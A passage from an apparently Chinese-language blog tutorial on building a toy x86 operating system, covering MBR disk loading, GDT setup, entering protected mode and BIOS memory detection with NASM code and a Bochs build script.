;LAB mid<br>    <br>    shr eax,cl                        <br>    mov dx,0x1f5<br>    out dx,al                         ;LAB high<br>    <br>shr eax,cl<br>and al,0x0f<br>or al,0xe0<br>mov dx,0x1f6<br>out dx,al                         ;lba 第 24-27位。设置 7-4 位为 1110 ，表示 lba 模式            <br><br>mov dx,0x1f7<br>mov al,0x20<br>out dx,al                         ;写入读取命令<br><br>.not_ready:                           ;还是0x1f7端口<br>nop<br>in al,dx<br>and al,0x88                       ;第 4 位为 1 表示硬盘控制器已准备好数据传输  第 7 位为 1 表示硬盘忙<br>cmp al,0x08 <br>jnz .not_ready                    ;直到准备好为止<br><br>mov ax,di                         <br>mov dx,256<br>mul dx<br>mov cx,ax                         ;di 为要读取的扇区数，一个扇区有512字节每次读入一个字116共需 di*512/2次，所以 di*<br>mov dx,0x1f0                      <br><br>.go_on_read:<br>in ax,dx<br>mov [bx],ax<br>add bx,2<br>loop .go_on_read<br>ret<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p>当然此时扇区2里面一点数据都没有，我们可以随便写一点loader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov sp,LOADER_BASE_ADDR<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;L&#x27;<br>mov byte [gs:0x01],0xa4  <br><br>mov byte [gs:0x02],&#x27;O&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;A&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;D&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;E&#x27;<br>mov byte [gs:0x09],0xa4<br><br>mov byte [gs:0x0a],&#x27;R&#x27;<br>mov byte [gs:0x0b],0xa4<br><br>jmp $<br></code></pre></td></tr></table></figure><p>编译后dd进磁盘的扇区2，所以pack.h也得改一改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/bin/bash</span><br>nasm -o ./mbr.bin ./mbr.S<br>nasm -o ./loader.bin ./load.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br>dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>然后就可以愉快的跳到0x900执行loader了</p><p><img src="/img/OS/8.png" alt="img"></p><p>但是这个loader并没有任何意义，因为他是在实模式下运行的，只是为了测试MBR的功能性。</p><h1 id="0x2-保护模式"><a href="#0x2-保护模式" class="headerlink" title="0x2:保护模式"></a>0x2:保护模式</h1><h2 id="段描述符（Segment-Descriptor）"><a href="#段描述符（Segment-Descriptor）" class="headerlink" title="段描述符（Segment Descriptor）"></a>段描述符（Segment Descriptor）</h2><p>随着时间的推移，8086进化成了80386，地址总线也从16位变成32位，but，段寄存器却还是16位从未变过</p><p>这是因为关于段的信息被存放在了内存中一块叫做<strong>段描述符</strong>的地方</p><p><img src="/img/OS/9.png" alt="img"></p><p>段描述符长8字节，64位，里面的各个位的具体含义如下</p><ul><li>0-15：段界限低16位</li><li>16-31：段基址低16位</li><li>32-39：段基址中8位</li><li>40-43：type 指定本描述符的类型，用于表示内存段和门的子类型。图出自《操作系统真象还原》</li><li><img src="/img/OS/10.png" alt="img"></li><li>44：S 0&#x2F;1 —&gt; 系统段&#x2F;数据段</li><li>45-46：DPL ，即<code>Descriptor Privilege Level</code>，描述符特权级，分0、1、2、3，数字越小，特权级越大</li><li>47：P <code>Present</code>，即段是否存在 0&#x2F;1 —&gt; 不存在&#x2F;存在</li><li>48-51：段界限高4位</li><li>52：AVL，即<code>AVaiLable</code>，可用的</li><li>53：L，是否为64位代码段 0&#x2F;1 —&gt; 否&#x2F;是</li><li>54：D&#x2F;B，表示有效地址（段内偏移地址）和操作数大小 0&#x2F;1 —&gt; 16位&#x2F;32位</li><li>55：G，粒度 0&#x2F;1 —&gt; 1B&#x2F; 4KB</li><li>56-63：段基址高8位</li></ul><p>你要问👴为什么段界限和段基址会被拆成这个JB样子，👴只能说兼容、兼容、还是牛魔的兼容</p><h2 id="全局描述符表GDT（Global-Descriptor-Table）"><a href="#全局描述符表GDT（Global-Descriptor-Table）" class="headerlink" title="全局描述符表GDT（Global Descriptor Table）"></a>全局描述符表GDT（Global Descriptor Table）</h2><p>一个段描述符只能描述一段内存，but内存被分成许多段是无法避免的，所以这时候全局描述符表就出现了，一个内存中专门用来存放段描述符的地方。</p><p>程序都可以在GDT中定义自己的段描述符，CPU通过一个专门指向GDT的寄存器<code>GDTR</code>和一个“下标”，也就是<code>selector</code>选择子，在GDT中精准的找到自己需要的段描述符</p><h3 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h3><p>48位寄存器，专门用来存储GDT的内存地址和大小,下图出自《操作系统真象还原》</p><p><img src="/img/OS/11.png" alt="img"></p><p>前16位是界限值，2^16 &#x3D; 65536，所以前16位的<code>max value</code> &#x3D; 65536 -1 &#x3D; 0xffff</p><p><code>and</code>一个段描述符长8字节，所以一个<code>GDT</code>最多存储8192个段描述符</p><p><strong>lgdt</strong>:对GDTR特攻指令，具体操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lgdt 48位内存数据<br></code></pre></td></tr></table></figure><h3 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h3><p>选择子是16位，下图出自《操作系统真象还原》</p><p><img src="/img/OS/12.png" alt="img"></p><p>0-1位：RPL，请求特权级，00为0，11为3</p><p>2位：TI，即<code>Table Indicator</code>，0为<code>GDT</code>中索引描述符，1为<code>LDT</code>（有全局当然也会有局部，<code>Local Descriptor Table</code>，局部描述符表）中索引描述表</p><p>高13位是索引值，2^13 &#x3D; 8192，即最多能有8192个段描述符，和上文相符</p><p><strong>PS：GDT中第0个索引值不可用，因为selector未初始化时为0</strong></p><p>至于<code>LDT</code>，和<code>GD</code>T类似，就不再赘述</p><h2 id="打开A20地址线"><a href="#打开A20地址线" class="headerlink" title="打开A20地址线"></a>打开A20地址线</h2><p>先来说说8086的地址回绕</p><h3 id="8086地址回绕"><a href="#8086地址回绕" class="headerlink" title="8086地址回绕"></a>8086地址回绕</h3><p>8086的地址总线是20位的，所以有A0-A19这20根地址线</p><p>在实模式下，采用段基址*16+偏移的寻址方式，不难发现，当0xffff：0xffff时，此时的逻辑地址是0x10ffef，但是，20位地址总线的最大值是0xfffff，在逻辑上这是正确的，但在物理内存中没有相应的地址。为了避免这个bug，所以8086采取的策略便是将逻辑地址对0x100000取模，这就是8086的地址回绕</p><h3 id="A20GATE"><a href="#A20GATE" class="headerlink" title="A20GATE"></a>A20GATE</h3><p>到了80286这个拥有24位地址总线的CPU，但是<code>intel</code>为了兼容考虑，在实模式下，仍然只开启A0-A19这低20位地址线，并采用8086地址回绕。</p><p>所以我们需要突破A20地址线，这就是说的打开<strong>A20GATE</strong></p><p>其实打开A20很简单，只要把0x92端口的第1位（最低位是第0位）置1，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al, 0x92<br>or al, 0000_0010b<br>out 0x92, al<br></code></pre></td></tr></table></figure><h2 id="CR0寄存器的PE位"><a href="#CR0寄存器的PE位" class="headerlink" title="CR0寄存器的PE位"></a>CR0寄存器的PE位</h2><p>先了解一下CR0-CR3寄存器</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>控制寄存器用于控制和确定处理器的操作模式以及当前执行任务的特性，在80386中有4个，分别为CR0、CR1、CR2、CR3，其中CR1被保留，为后续开发做准备。</p><p>CR0包括指示处理器工作方式的控制位，包含启用和禁止分页管理机制的控制位，包含控制浮点协处理器操作的控制位。CR2及CR3由分页管理机制使用。CR0中的位5—位30及CR3中的位0至位11是保留位，这些位不能是随意值，必须为0。</p><p>详细介绍一下CR0寄存器</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>下两图出自《操作系统真象还原》</p><p><img src="/img/OS/13.png" alt="img"></p><p><img src="/img/OS/14.png" alt="img"></p><p>第0位：PE，即<code>Protection Enable</code>，为0时是实模式，为1时是保护模式，所以PE便是我们的目标，将他置1也很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,cr0<br>or eax,0x00000001<br>mov cr0,eax<br></code></pre></td></tr></table></figure><p>顺带提一嘴，只有CR0的最高位PG为1，开启分页时，CR3才会被启用</p><h2 id="about-CPU"><a href="#about-CPU" class="headerlink" title="about CPU"></a>about CPU</h2><h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><p>虽然执行单元EU是CPU执行指令的唯一部件，但是CPU 的指令执行过程分为取指令、译码、执行三个步骤。每个步骤都是独立执行的， CPU 可以一边执行指令，一边取指令，一边译码。CPU是只能一次处理一个指令，但是也妹说不能干的别的事啊😋。这样就使效率得到极大的提升。</p><h4 id="jmp清空"><a href="#jmp清空" class="headerlink" title="jmp清空"></a>jmp清空</h4><p>CPU 是按照程序中指令顺序来填充流水线的，大多是情况下当前指令和下一条指令在空间上是挨着的。但如果当前执行的指令是jmp ，下一条指令已经被送上流水线译码了，第三条指令已经被送上流水线取指。but因为<code>cs:ip</code>已经跳到不知道哪去了，所以 CPU 在遇到无条件转移指令 jmp 时，会清空流水线。</p><h3 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h3><p>随着流水线而来的一个问题便是，如果CPU遇到一个条件跳转语句，假设两条路分别时A、B，那么CPU在还未执行判断语句的时候，是如何选择A或B进入流水线的？</p><p>最简单的方法是 2 位预测法。用 2 位 bit 的计数器来记录跳转状态，每跳转一次加 1，如果未跳转就减 1。当遇到跳转指令时，如果计数器的值大于 1 则跳转，如果小于等于 1 则不跳。这基于的原理是当一件事情发生时，有很大概率下一次还会发生。</p><p>同时，intel架构的CPU中存在分支目标缓冲器（<code>Branch Target Buffer</code>,BTB），会将分支指令的地址和跳转信息存放在其中，CPU在下一次遇到分支指令时，会在BTB寻找相同地址的指令，参照其中的统计信息，选择将哪一个分支载入流水线。如果未找到相同地址，会使用<code>Static Predictor</code>，即静态预测，这是基于大量代码的共同特征总结的。比如循环结构体一般都在结束跳转指令的上方。</p><p>当然加载错误的分支指令也没关系，只要在CPU执行前制止就行了，虽然清空流水线装载正确分支的花销挺大的😓</p><h3 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h3><p>就是 CPU 中运行的指令并不按照代码中的顺序执行，而是按照一定的策略打乱顺序执行，也许后面的指令先执行，当然，得保证指令之间不具备相关性 。</p><p>比如下面的例子，第一个指令需要去内存中寻找值，而add ebx只需要简单的加法操作就行了，所以CPU就会在指令1访问内存的等待中执行指令2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, [0xfff00]<br>add ebx, 1<br></code></pre></td></tr></table></figure><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p> 缓存是 20 世纪最大的发明，其原理是用一些存取速度较快的存储设备作为数据缓冲区，避免频繁访问速度较慢的低速存储设备，归根结底的原因是低速存储设备是整个系统的瓶颈，缓存用来缓解“瓶颈设备”的压力（摘自《操作系统真象还原》）。都知道木桶原理，和硬盘相比，内存<code>DRAM</code>的速度已经够快了，却还是连<code>CPU</code>的尾气都吃不到。所以，内存8行，就出现了三级缓存L1、L2、L3（<code>SRAM</code>，静态随机访问储存器，期待能在amd的三缓里在装系统的那天😚）。寄存器和<code>SRAM</code>在速度上是同一级别的东西，都是用相同的存储电路实现的，用的都是触发器，速度快的飞起 。</p><p> 比如当循环执行一段code时，短时间内这块内存将被高频率访问，如果将这块code放到三缓里，就能极大的提高程序运行效率。</p><h2 id="PE模式下的内存保护措施"><a href="#PE模式下的内存保护措施" class="headerlink" title="PE模式下的内存保护措施"></a>PE模式下的内存保护措施</h2><p><del>都叫保护模式了保护措施能少🐎</del></p><p><strong>段描述符&amp;选择子</strong></p><p>对使用<code>selector</code>的检查：<code>check</code>索引值，<code>check</code>是否使用了gdt中索引【0】的段描述表</p><p>针对段描述符中的<code>type</code>字段，有下列几个原则</p><ul><li>只有具备可执行属性的段才能加载到CS寄存器中</li><li>只具有可执行属性的段不允许加载到除CS外的段寄存器中</li><li>只有具备可写属性的段才能加载到SS寄存器中</li><li>至少具备可读属性的段才能加载到DS、ES、FS、GS段寄存器中</li></ul><p><code>check type</code>后，还会<code>chekc</code> P位确认内存段是否存在，访问过相应段后，会将其段描述符中的A位置1（这算什么，标记？bushi）</p><p><strong>Data &amp; System Segment</strong></p><p>段界限check</p><p>段界限：<br>$$<br>（段界限+1）*粒度-1<br>$$<br>这要注意这个就差不多了</p><p>ok，前置知识基本讲完了，可以进入保护模式了！！ヾ(≧▽≦*)o</p><h2 id="Let’s-go"><a href="#Let’s-go" class="headerlink" title="Let’s go!"></a>Let’s go!</h2><h3 id="boot-inc"><a href="#boot-inc" class="headerlink" title="boot.inc"></a>boot.inc</h3><p>多了好多配置信息</p><p><code>nasm</code>还挺人性化的，可以在数字中加”_”使数位更清楚，且不影响值的表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----loader &amp; kernel msg-----<br>LOADER_BASE_ADDR equ 0x900<br>LOADER_START_SECTOR equ 0x2<br>;-----the value of GDT-----<br>DESC_G_4K equ 1000_0000_00000000_00000000b     ;G: 4kb<br>DESC_D_32 equ  100_0000_00000000_00000000b     ;D: 32位<br>DESC_L equ   00_0000_00000000_00000000b ;L: 32位代码段<br>DESC_AVLequ    0_0000_00000000_00000000b ;无意义<br>DESC_LIMIT_CODE2 equ      1111_00000000_00000000b ;平坦模式，就是0xf<br>DESC_LIMIT_DATA2 equ DESC_LIMIT_CODE2<br>DESC_LIMIT_VIDEO2equ      0000_00000000_00000000b ;这边设置video是为了表示显存（0xb8000），所以limit设置0<br>DESC_Pequ           10000000_00000000b ;P: 存在<br>DESC_DPL_0equ            0000000_00000000b     <br>DESC_DPL_1equ          0100000_00000000b<br>DESC_DPL_2equ            1000000_00000000b<br>DESC_DPL_3equ            1100000_00000000b<br>DESC_S_CODEequ              10000_00000000b ;S: 非系统段，代码段<br>DESC_S_DATAequ DESC_S_CODE                      ;S: 非系统段，数据段<br>DESC_S_sys equ  00000_00000000b     ;S: 系统段<br>DESC_TYPE_CODEequ       1000_00000000b     ;只执行代码段<br>DESC_TYPE_DATAequ       0010_00000000b     ;只读，向下扩展的数据段<br>;-----code gdt高位4字节-----<br>DESC_CODE_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_CODE2 + DESC_P + DESC_DPL_0 + DESC_S_CODE + DESC_TYPE_CODE + 0x00<br>;-----data gdt高四位字节-----<br>DESC_DATA_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_DATA2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x00<br>;-----video gdt高四位字节-----<br>DESC_VIDEO_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_VIDEO2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x0b<br>;-----the value of selector-----<br>RPL0equ 00b<br>RPL1equ 01b<br>RPL2equ 10b<br>RPL3equ 11b<br>TI_GDTequ 000b<br>TI_LDTequ 100b<br></code></pre></td></tr></table></figure><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><p>mbr和前面的还是一样的。只是load.s经过编译后得到的load.bin的size大于512，所以读取扇区的数量改变，这边直接改成4了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,LOADER_START_SECTOR<br>mov bx,LOADER_BASE_ADDR<br>mov cx,4                    ;sector count<br>call rd_disk_m_16<br></code></pre></td></tr></table></figure><p>pack的时候脚本也有变化</p><p><code>count</code>改为4</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=4 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><h3 id="Load-S"><a href="#Load-S" class="headerlink" title="Load.S"></a>Load.S</h3><p>load.s要改的就比较多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>LOADER_STACK_TOP equ LOADER_BASE_ADDR<br><br>jmp loader_start<br><br>GDT_BASE:                   ;gdt[0]为空<br>dd 0x00000000<br>dd 0x00000000<br><br>CODE_DESC:                  ;gdt[1]<br>dd 0x0000ffff<br>dd DESC_CODE_HIGH4<br><br>DATA_STACK_DESC:            ;gdt[2] <br>dd 0x0000ffff<br>dd DESC_DATA_HIGH4<br><br>VIDEO_DESC:                 ;gdt[3]<br>dd 0x80000007           ;(0xbffff-0xb8000)/4k = 7 <br>dd DESC_VIDEO_HIGH4<br><br>GDT_SIZEequ $ - GDT_BASE    ; 0x8*4<br>GDT_LIMITequ GDT_SIZE - 1    ; 0x20 - 1 <br>times 60 dq 0<br><br>SELECTOR_CODE equ (0x0001&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_DATAequ (0x0002&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_VIDEO equ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>gdt_ptrdw GDT_LIMIT<br>dd GDT_BASE<br><br>loadermsg db &#x27;korey is ready&#x27;<br><br>loader_start:<br>mov sp, LOADER_BASE_ADDR ;print &quot;korey is ready&quot;<br>mov bp, loadermsg<br>mov cx, 14<br>mov ax, 0x1301<br>mov bx, 0x001f<br>mov dx, 0x1800<br>int 0x10<br><br>in al, 0x92              ;open A20 gate<br>or al, 0000_0010b<br>out 0x92, al<br><br>lgdt [gdt_ptr]           ;load gdt<br> <br>mov eax, cr0             ;real mode to protection mode<br>or eax, 0x00000001<br>mov cr0, eax<br><br>jmp dword SELECTOR_CODE:p_mode_start    ;刷新流水线<br><br>[bits 32]<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov byte [gs:160], &#x27;P&#x27;<br><br>jmp $<br></code></pre></td></tr></table></figure><p>可以看到<code>jmp dword SELECTOR_CODE:p_mode_start</code>这句代码感觉有点脱裤子放屁，毕竟程序流只要顺序执行也能滑到<code>p_mode_start </code>，那为什么用<code>jmp</code>呢？因为CPU采用流水线作业（上面提到过），会将几条指令放在一起重叠执行（感觉<code>mips</code>架构这个特点就很显著），所以<code>p_mode_start</code>是32位的，和16位的一起执行直接能把CPU的CPU干烧了，这是其一。其二是虽然进入了32位保护模式，ds，cs，ss这些段寄存器里还是16位的段基址。其他位默认0，导致D位&#x3D;0，也即是进入32位模式了段寄存器还是被认为是16位，那就麻烦大了。并且<code>mov cs, xxx</code>这类指令是被禁止的，只有用远调用指令<code>call</code>，远转移指令<code>jmp</code>，远返回指令<code>retf</code>可以间接改变CS的值。所以用<code>jmp</code>清空流水线并刷新CS寄存器。</p><p>展示个结果</p><p><img src="/img/OS/15.png" alt="img"></p><h1 id="0x3-PE-to-Kernel-！！"><a href="#0x3-PE-to-Kernel-！！" class="headerlink" title="0x3:PE to Kernel ！！"></a>0x3:PE to Kernel ！！</h1><h2 id="获取内存容量"><a href="#获取内存容量" class="headerlink" title="获取内存容量"></a>获取内存容量</h2><p><code>BIOS</code>的0x15中断号中，提供了3个子功能来获取内存容量</p><ul><li>EAX &#x3D; 0xE820，遍历所有内存</li><li>EAX &#x3D; 0xE801，检测低15MB和16MB-4GB的内存，最大支持4GB</li><li>AH &#x3D; 0x88，最多检测64MB，超过64MB也返回64MB</li></ul><p>这三种功能返回的信息详细程度一词5递减，但是操作复杂程度反之</p><h3 id="0xE820"><a href="#0xE820" class="headerlink" title="0xE820"></a>0xE820</h3><p>此功能每次会返回一个不同属性的内存布局信息，因此需要不停迭代来获取全部内容</p><p>因为返回的信息较为丰富，寄存器无法存放，所以需要结构体来存放返回值，此结构体为地址范围描述符（Address Range Descripter Structure, ARDS），格式如下图。此表来自《操作系统真象还原》</p><p><img src="/img/OS/17.png" alt="img"></p><p>type字段的意义如下。此表来自《操作系统真象还原》</p><p><img src="/img/OS/18.png" alt="img"></p><p>同时，0xE820在中断前，还需要几个寄存器布置参数，返回后的值也储存在几个寄存器中。此表来自《操作系统真象还原》</p><p><img src="/img/OS/19.png" alt="img"></p><p>动手写一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">；前半部分和load.S一样<br>times 60 dq 0<br><br>total_mem_bytes dd 0<br>gdt_ptr dw GDT_LIMIT<br>dd GDT_BASE<br><br>ards_buf times244 db 0<br>ards_nrdw 0<br><br>loader_start:<br>xor ebx,ebx<br>mov esi, ards_buf<br>mov es,esi<br>xor esi,esi<br>xor edi,edi<br>.e820:<br>mov eax,0xe820<br>mov ecx,20<br>mov edx,0x534d4150<br>int 0x15<br>add edi,20<br>cmp ebx, 0<br>jnz .e820<br><br>jmp $<br></code></pre></td></tr></table></figure><p>看看ARDS</p><p><img src="/img/OS/20.png" alt="img"></p><h3 id="0xE801"><a href="#0xE801" class="headerlink" title="0xE801"></a>0xE801</h3><p>只需eax寄存器&#x3D;0xe801即可执行int 0x15调用</p><p>返回时，eax &#x3D; ecx，粒度为1kB，只显示15MB及以下的内存容量；ebx &#x3D; edx，粒度为64KB，显示16MB-4GB的内存</p><p>but我们获得的内存总量总是比实际大小小1MB，这是为了兼容老ISA设备，最后输出的时候加上去就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.e801:<br>mov ax, 0xe801<br>int 0x15<br>mov ecx, 0x00000400<br>    mul ecx<br>    add eax, 0x100000<br>    mov esi, eax<br>    xor eax, eax<br>    mov eax, ebx<br>    mov ecx, 0x10000<br>    mul ecx<br>    add esi, eax<br><br>mov [total_mem_bytes],esi<br><br>jmp $<br></code></pre></td></tr></table></figure><p><img src="/img/OS/16.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#megs: 256<br>#megs: 128<br>megs: 64<br>#megs: 64<br>#megs: 16<br>#megs: 8<br></code></pre></td></tr></table></figure><p>和配置文件相符</p><h3 id="0x88"><a href="#0x88" class="headerlink" title="0x88"></a>0x88</h3><p>只需ah &#x3D; 0x88，返回值也只有一个，存储在eax中，最后再加上一个1MB就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.88:<br>mov ah, 0x88<br>int 0x15<br>mov ecx,0x400<br>mul ecx<br>add eax,0x100000<br><br>mov [total_mem_bytes],eax<br><br>jmp $<br></code></pre></td></tr></table></figure><h2 id="内存分页"><a href="#内存分页" class="headerlink" 